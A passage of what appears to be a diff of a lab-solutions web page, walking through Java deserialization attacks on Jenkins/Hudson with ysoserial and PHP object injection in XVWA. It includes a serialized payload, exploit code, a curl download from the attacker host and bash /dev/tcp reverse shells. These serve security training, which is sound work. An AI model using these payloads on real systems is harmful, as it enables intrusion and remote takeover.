65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x03\x49\x00\x02\x69\x64\x49\x00\x08\x6c\x61\x73\x74\x49\x6f\x49\x64\x4c\x00\x08\x72\x65\x73\x70\x6f\x6e\x73\x65\x74\x00\x1a\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x52\x65\x73\x70\x6f\x6e\x73\x65\x3b\x77\x04\x00\x00\x00\x00\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x09\x63\x72\x65\x61\x74\x65\x64\x41\x74\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x3b\x77\x04\x00\x00\x00\x00\x78\x70\x73\x72\x00\x1e\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x24\x53\x6f\x75\x72\x63\x65\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x06\x74\x68\x69\x73\x24\x30\x74\x00\x19\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x43\x6f\x6d\x6d\x61\x6e\x64\x3b\x77\x04\x00\x00\x00\x00\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\xd0\xfd\x1f\x3e\x1a\x3b\x1c\xc4\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\xd5\xc6\x35\x27\x39\x77\xb8\xcb\x03\x00\x04\x4c\x00\x05\x63\x61\x75\x73\x65\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\x3b\x4c\x00\x0d\x64\x65\x74\x61\x69\x6c\x4d\x65\x73\x73\x61\x67\x65\x71\x00\x7e\x00\x02\x5b\x00\x0a\x73\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x74\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x4c\x00\x14\x73\x75\x70\x70\x72\x65\x73\x73\x65\x64\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x73\x74\x00\x10\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4c\x69\x73\x74\x3b\x77\x04\xff\xff\xff\xfd\x78\x70\x71\x00\x7e\x00\x10\x70\x75\x72\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x02\x46\x2a\x3c\x3c\xfd\x22\x39\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x0b\x73\x72\x00\x1b\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x61\x09\xc5\x9a\x26\x36\xdd\x85\x02\x00\x04\x49\x00\x0a\x6c\x69\x6e\x65\x4e\x75\x6d\x62\x65\x72\x4c\x00\x0e\x64\x65\x63\x6c\x61\x72\x69\x6e\x67\x43\x6c\x61\x73\x73\x71\x00\x7e\x00\x02\x4c\x00\x08\x66\x69\x6c\x65\x4e\x61\x6d\x65\x71\x00\x7e\x00\x02\x4c\x00\x0a\x6d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x71\x00\x7e\x00\x02\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x43\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x74\x00\x0c\x43\x6f\x6d\x6d\x61\x6e\x64\x2e\x6a\x61\x76\x61\x74\x00\x06\x3c\x69\x6e\x69\x74\x3e\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x32\x71\x00\x7e\x00\x15\x71\x00\x7e\x00\x16\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x63\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x74\x00\x0c\x52\x65\x71\x75\x65\x73\x74\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x02\x39\x74\x00\x32\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x24\x52\x50\x43\x52\x65\x71\x75\x65\x73\x74\x74\x00\x1c\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\xf6\x74\x00\x27\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x71\x00\x7e\x00\x1e\x74\x00\x06\x69\x6e\x76\x6f\x6b\x65\x73\x71\x00\x7e\x00\x13\xff\xff\xff\xff\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x24\x50\x72\x6f\x78\x79\x31\x70\x74\x00\x0f\x77\x61\x69\x74\x46\x6f\x72\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x04\xe7\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x68\x61\x6e\x6e\x65\x6c\x74\x00\x0c\x43\x68\x61\x6e\x6e\x65\x6c\x2e\x6a\x61\x76\x61\x74\x00\x15\x77\x61\x69\x74\x46\x6f\x72\x52\x65\x6d\x6f\x74\x65\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x93\x74\x00\x0e\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x74\x00\x08\x43\x4c\x49\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x48\x74\x00\x1f\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x74\x00\x19\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x2e\x6a\x61\x76\x61\x74\x00\x07\x63\x6f\x6e\x6e\x65\x63\x74\x73\x71\x00\x7e\x00\x13\x00\x00\x01\xdf\x71\x00\x7e\x00\x2a\x71\x00\x7e\x00\x2b\x74\x00\x05\x5f\x6d\x61\x69\x6e\x73\x71\x00\x7e\x00\x13\x00\x00\x01\x86\x71\x00\x7e\x00\x2a\x71\x00\x7e\x00\x2b\x74\x00\x04\x6d\x61\x69\x6e\x73\x72\x00\x26\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x4c\x69\x73\x74\xfc\x0f\x25\x31\xb5\xec\x8e\x10\x02\x00\x01\x4c\x00\x04\x6c\x69\x73\x74\x71\x00\x7e\x00\x0f\x77\x04\xff\xff\xff\xfd\x78\x72\x00\x2c\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x19\x42\x00\x80\xcb\x5e\xf7\x1e\x02\x00\x01\x4c\x00\x01\x63\x74\x00\x16\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x3b\x77\x04\xff\xff\xff\xfd\x78\x70\x73\x72\x00\x13\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x41\x72\x72\x61\x79\x4c\x69\x73\x74\x78\x81\xd2\x1d\x99\xc7\x61\x9d\x03\x00\x01\x49\x00\x04\x73\x69\x7a\x65\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x00\x77\x04\x00\x00\x00\x00\x78\x71\x00\x7e\x00\x39\x78\x71\x00\x7e\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x70\x00\x00\x00\x01\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f\x10\x73\x29\x6c\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x01\x74\x00\x18\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x6c\x69\x45\x6e\x74\x72\x79\x50\x6f\x69\x6e\x74\x71\x00\x7e\x00\x24\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x01\x74\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x74\x00\x1d\x52\x50\x43\x52\x65\x71\x75\x65\x73\x74\x28\x31\x2c\x77\x61\x69\x74\x46\x6f\x72\x50\x72\x6f\x70\x65\x72\x74\x79\x29</span><span class="sh">'</span>
+<span class="k">print</span> <span class="sh">'</span><span class="s">sending payload...</span><span class="sh">'</span>
+<span class="n">sock</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">received </span><span class="sh">"</span><span class="s">%s</span><span class="sh">"'</span> <span class="o">%</span> <span class="n">data</span><span class="p">)</span>
+
+<span class="n">sock</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Step 5: Create a reverse shell payload.</p>
+
+<p>Copy and paste the command into a file and save it as shell.sh.</p>
+
+<p>Syntax:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/&lt;lhost&gt;/&lt;lport&gt; 0&gt;&amp;1
+</code></pre></div></div>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/192.24.161.2/9999 0&gt;&amp;1
+</code></pre></div></div>
+
+<p>Step 6: Setup a Netcat listener that will be listening for connections on port 9999.</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvp</span> 9999
+</code></pre></div></div>
+
+<p>Step 7: Host the shell.sh file using a Python SimpleHTTPServer. In the same directory where the file is present, execute the below.</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-m</span> SimpleHTTPServer 8888
+</code></pre></div></div>
+
+<p>Step 8: Generate a payload with a ysoserial file and make the target machine download the shell.sh file from attacker machine.</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-jar</span> ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections1 <span class="s2">"curl http://192.24.161.2:8888/shell.sh -o /tmp/shell.sh"</span> <span class="o">&gt;</span> /root/payload.out
+</code></pre></div></div>
+
+<p>Step 9: Execute the python exploit code.</p>
+
+<p>Usage: python exploit.py <host> <port> &lt;/path/to/payload&gt;</port></host></p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python exploit.py 192.24.161.3 8080 /root/payload.out
+</code></pre></div></div>
+
+<p>This result from the python server shows that shell.sh file is downloaded by the target machine, and the payload is working as expected.</p>
+
+<p>We have to run the python exploit two more times to execute the bash script in the target machine.</p>
+
+<p>Step 10: Generate a payload again for making the downloaded shell.sh file executable.</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-jar</span> ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections1 <span class="s2">"chmod +x /tmp/shell.sh"</span> <span class="o">&gt;</span> /root/payload.out
+</code></pre></div></div>
+
+<p>Step 11: Execute the python code again to send the payload for making shell.sh file executable.</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python exploit.py 192.24.161.3 8080 /root/payload.out
+</code></pre></div></div>
+
+<p>Step 12: Generate a payload for executing the downloaded shell.sh file again.</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-jar</span> ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections1 <span class="s2">"/bin/bash /tmp/shell.sh"</span> <span class="o">&gt;</span> /root/payload.out
+</code></pre></div></div>
+
+<p>Step 13: Execute the python code again to send the payload to the target machine for executing shell.sh file.</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python exploit.py 192.24.161.3 8080 /root/payload.out
+</code></pre></div></div>
+
+<p>Step 14: Open the terminal where the Netcat was listening. The shell should arrive on the Netcat listener.</p>
+
+<p>Check the id by the following command.</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">id</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>Successfully achieved remote code execution.</p>
+</blockquote>
+
+<h2 id="lab-3">Lab 3</h2>
+<p>Solution</p>
+
+<p>Step 1: Open the lab link to access the Kali GUI instance.</p>
+
+<p>Step 2: Check if the provided machine/domain is reachable.</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping <span class="nt">-c3</span> demo.ine.local
+</code></pre></div></div>
+
+<p>The provided machine is reachable.</p>
+
+<p>Step 3: Check open ports on the provided machine.</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">-sV</span> demo.ine.local
+</code></pre></div></div>
+
+<p>Port 80 (Apache webserver) and 3306 (MySQL server) are open on the target machine.</p>
+
+<p>Step 4: Open the browser to inspect the hosted website.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>URL: http://demo.ine.local
+</code></pre></div></div>
+
+<blockquote>
+  <p>An instance of XVWA is hosted on the Apache webserver.</p>
+</blockquote>
+
+<p>Step 5: Open PHP Object Injection page.</p>
+
+<p>Select PHP Object Injection from the available set of vulnerabilities:</p>
+
+<p>Step 6: Interact with the vulnerable page.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Press the CLICK HERE button and notice the resulting URL:
+</code></pre></div></div>
+
+<p>You should see the following URL:</p>
+
+<p>http://demo.ine.local/xvwa/vulnerabilities/php_object_injection/?r=a:2:{i:0;s:4:”XVWA”;i:1;s:33:”Xtreme Vulnerable Web Application”;}</p>
+
+<p>There is an object in the URL parameter</p>
+
+<blockquote>
+  <p>If you notice closely, the values present in this parameter - XVWA and Xtreme Vulnerable Web Application are shown on the page.</p>
+</blockquote>
+
+<p>But what exactly is this object contained in the <strong>r</strong> parameter?</p>
+
+<p>Lets search for it:</p>
+
+<p>Search string:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a:2:<span class="o">{</span>i:0<span class="p">;</span>s:4:<span class="s2">""</span><span class="p">;</span>i:1<span class="p">;</span>s:33:<span class="s2">""</span><span class="p">;</span><span class="o">}</span>
+</code></pre></div></div>
+
+<p>We have intentionally omitted any references to XVWA to avoid getting results specific to it.</p>
+
+<p>Notice we got back some results indicating it is serialized PHP data.</p>
+
+<p>One of the comments on SO also indicates to use the PHP serialize and unserialize methods on this kind of input:</p>
+
+<p>Let’s try to produce similar results using the serialize method from PHP:</p>
+
+<p>Commands:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php <span class="nt">-a</span>
+<span class="nb">echo </span>serialize<span class="o">(</span><span class="s2">"Hello World!"</span><span class="o">)</span><span class="p">;</span>
+<span class="nb">echo </span>serialize<span class="o">(</span>array<span class="o">(</span><span class="s1">'a'</span>, 2, <span class="s1">'c'</span>, 4, <span class="s1">'e'</span>, 6, <span class="s1">'g'</span>, 8, <span class="s1">'i'</span>, 10<span class="o">))</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>The above commands would do the following:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php <span class="nt">-a</span>: Launch an interactive PHP environment - a REPL <span class="o">(</span>read-eval-print-loop<span class="o">)</span><span class="nb">.</span> Here we can run PHP code without having to <span class="nb">set </span>up any webserver.
+</code></pre></div></div>
+
+<p>The second command serialized the string Hello World!.</p>
+
+<p>The result is simple enough -</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>s:12 
+<span class="c"># indicates what follows is a string of 12 characters.</span>
+</code></pre></div></div>
+
+<p>The third command goes one step ahead and serializes an array, which is where serialization has its value - more on that shortly.</p>
+
+<p>The output says</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a:10
+<span class="sb">```</span>bash
+
+, indicating what follows is an array of size 10. Then we have all the elements of the array. Each array elements index and value are indicated. For instance, lets consider the first two elements:
+
+<span class="sb">```</span>bash
+i:0<span class="p">;</span>s:1:<span class="s2">"a"</span>
+<span class="c"># Element at index 0 is a string of size 1 and that string is "a".</span>
+i:0<span class="p">;</span>i:2
+<span class="c"># Element at index 1 is an integer and it's value is 2.</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>Hopefully, this makes much more sense now.</p>
+</blockquote>
+
+<p>What’s serialization?</p>
+
+<ul>
+  <li>
+    <p>Sometimes you get to situations where you have to pass objects over the network, or the state of a program is to be stored for later use. How can you do that, provided that the information is present in an object?</p>
+  </li>
+  <li>
+    <p>One possibility is to save all the object’s properties and then populate them back later. That would be good, but it would be reinventing the wheel and would not be as optimized and compact as it could have been. Serialized objects must also later be deserialized. Since this is a standard requirement, it is built-in into the programming languages like Java, PHP, and the like.</p>
+  </li>
+</ul>
+
+<blockquote>
+  <p>Now that we know the parameter we saw in the URL was actually a PHP serialized object, let’s figure it out using what we learned above:</p>
+</blockquote>
+
+<p>Commands:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php <span class="nt">-a</span>
+<span class="nb">echo </span>unserialize<span class="o">(</span><span class="s1">'a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}'</span><span class="o">)</span><span class="p">;</span>
+var_dump<span class="o">(</span>unserialize<span class="o">(</span><span class="s1">'a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}'</span><span class="o">))</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>We run the PHP code from the interactive mode and unserialize the PHP object. Notice that it is an associative array having two items.</p>
+
+<p>Check the PHP manual for unserialize:</p>
+
+<p>Notice the big red warning message. It’s a clear warning to the developers about the RCE threat if they pass user-controlled input to the
+unserialize function.</p>
+
+<p>Step 7: Check the source code of the PHP Object Injection page from Github.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>URL: https://github.com/s4n7h0/xvwa/blob/master/vulnerabilities/php_object_injection/home.php
+</code></pre></div></div>
+
+<p>Notice the relevant code snippet shown in the above image. If the request contains the parameter <strong>r</strong>, its value is unserialized. Also, notice the call to <strong>eval</strong> - the inject parameter is directly passed to <strong>eval</strong>, which is an excellent opportunity for RCE.</p>
+
+<p>Step 8: Exploit the insecure PHP deserialization vulnerability.</p>
+
+<p>Save the following code snippet as object.php</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="kd">class</span> <span class="nc">PHPObjectInjection</span> <span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$inject</span> <span class="o">=</span> <span class="s2">"system('id');"</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PHPObjectInjection</span><span class="p">();</span>
+<span class="nb">var_dump</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$obj</span><span class="p">));</span>
+<span class="cp">?&gt;</span>
+
+</code></pre></div></div>
+
+<p>Notice the above code snippet sets the inject parameter to system(‘id’), which would run the id command on the webserver.</p>
+
+<p>Serialize the object:</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php object.php
+</code></pre></div></div>
+
+<p>Serialized payload:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>O:18:<span class="s2">"PHPObjectInjection"</span>:1:<span class="o">{</span>s:6:<span class="s2">"inject"</span><span class="p">;</span>s:13:<span class="s2">"system('id');"</span><span class="p">;</span><span class="o">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Assign the generated value in the <strong>r</strong> parameter in the URL:</li>
+</ul>
+
+<p>Notice the results of the id command are shown on the page.</p>
+
+<p>With that, we successfully exploited the insecure deserialization issue to run arbitrary commands.</p>
+
+<p>Step 9: Check the list of running processes.</p>
+
+<p>Now that we have code execution on the target server, let’s check the list of running processes:</p>
+
+<p>Save the following code snippet as object.php</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="kd">class</span> <span class="nc">PHPObjectInjection</span> <span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$inject</span> <span class="o">=</span> <span class="s2">"system('ps aux');"</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PHPObjectInjection</span><span class="p">();</span>
+<span class="nb">var_dump</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$obj</span><span class="p">));</span>
+<span class="cp">?&gt;</span>
+
+</code></pre></div></div>
+
+<p>Serialize the object:</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php object.php
+</code></pre></div></div>
+
+<p>Serialized payload:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>O:18:<span class="s2">"PHPObjectInjection"</span>:1:<span class="o">{</span>s:6:<span class="s2">"inject"</span><span class="p">;</span>s:17:<span class="s2">"system('ps aux');"</span><span class="p">;</span><span class="o">}</span>
+</code></pre></div></div>
+
+<p>Assign the generated value in the <strong>r</strong> parameter in the URL:</p>
+
+<p>The process listing is retrieved, as shown in the above image.</p>
+
+<p>Check the page source for a better-formatted response (press CTRL+U):</p>
+
+<p>Step 10: Obtain a reverse shell.</p>
+
+<p>Running single commands is good, but it requires us to generate the serialized value every time.</p>
+
+<blockquote>
+  <p>Let’s get a reverse shell to avoid that.</p>
+</blockquote>
+
+<p>Before moving on to the payload generation part, retrieve the IP address of the attacker machine:</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ip addr
+</code></pre></div></div>
+
+<p>The IP address of the attacker machine is 192.222.13.2</p>
+
+<blockquote>
+  <p>[Note] The IP address is bound to change with every lab run. Kindly make sure to replace the IP address used in the payload. Otherwise, the payload wouldn’t work.</p>
+</blockquote>
+
+<p>Save the following code snippet as object.php</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="kd">class</span> <span class="nc">PHPObjectInjection</span> <span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$inject</span> <span class="o">=</span> <span class="s2">"system('/bin/bash -c \'bash -i &gt;&amp; /dev/tcp/192.222.13.2/54321 0&gt;&amp;1\'');"</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PHPObjectInjection</span><span class="p">();</span>
+<span class="nb">var_dump</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$obj</span><span class="p">));</span>
+<span class="cp">?&gt;</span>
+
+</code></pre></div></div>
+
+<p>Serialize the object:</p>
+
+<p>Command:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">php</span> <span class="n">object</span><span class="mf">.</span><span class="n">php</span>
+</code></pre></div></div>
+
+<p>Serialized payload:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">O</span><span class="o">:</span><span class="mi">18</span><span class="o">:</span><span class="s2">"PHPObjectInjection"</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">"inject"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">71</span><span class="o">:</span><span class="s2">"system('/bin/bash -c \'bash -i &gt;&amp; /dev/tcp/192.222.13.2/54321 0&gt;&amp;1\'');"</span><span class="p">;}</span>
+</code></pre></div></div>
+
+<p>Start a Netcat listener on port 54321 (since we specified this port in the reverse shell payload as well):</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvp</span> 54321
+</code></pre></div></div>
+
+<p>Assign the generated value in the <strong>r</strong> parameter in the URL:</p>
+
+<p>It didn’t work. But why is that?</p>
+
+<p>It is because the serialized payload contains characters like <strong>/</strong> and <strong>&amp;</strong> which are treated specially by the web browser and the server.</p>
+
+<blockquote>
+  <p>To avoid that, we will encode the serialized payload.</p>
+</blockquote>
+
+<p>You can use Burp to do that or use websites like https://www.url-encode-decode.com/ to get the job done:</p>
+
+<p>URL-encoded serialized payload:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>O%3A18%3A%22PHPObjectInjection%22%3A1%3A%7Bs%3A6%3A%22inject%22%3Bs%3A71%3A%22system%28%27%2Fbin%2Fbash+-c+%5C%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.222.13.2%2F54321+0%3E%261%5C%27%27%29%3B%22%3B%7D
+</code></pre></div></div>
+
+<blockquote>
+  <p>[Note] Make sure not to copy this payload as is, since the IP would be different for the attacker machine assigned to you.</p>
+</blockquote>
+
+<p>Assign the URL-encoded payload in the <strong>r</strong> parameter in the URL:</p>
+
+<p>Check the terminal where the Netcat listener was running:</p>
+
+<blockquote>
+  <p>We have gained a reverse shell!</p>
+</blockquote>
+
+<p>Now we can run commands without having to generate command payloads every single time:</p>
+
+<p>Commands:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">id
+pwd
+ls</span> <span class="nt">-al</span>
+</code></pre></div></div>
+
+<p>With that, we conclude this lab on Insecure PHP Deserialization also known as PHP Object Injection.</p>
+
+<blockquote>
+  <p>We learned about serialization and deserialization, how to generate serialized values, and how to unserialize them. We also reviewed the PHP code and uncovered the use of a code execution sink, namely the eval function.</p>
+</blockquote>
+
+<blockquote>
+  <p>Finally, we exploited the vulnerable code by generating malicious serialized objects to gain command execution on the target server.</p>
+</blockquote>
+
+<p>References:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- XVWA = https://github.com/s4n7h0/xvwa
+- PHP Associative Arrays = https://www.w3schools.com/PHP/php_arrays_associative.asp
+- PHP Serialize = https://www.php.net/manual/en/function.serialize.php
+- PHP Unserialize = https://www.php.net/manual/en/function.unserialize.php
+</code></pre></div></div>
+
+<h2 id="lab-4">Lab 4</h2>
+<p>Solutions</p>
+
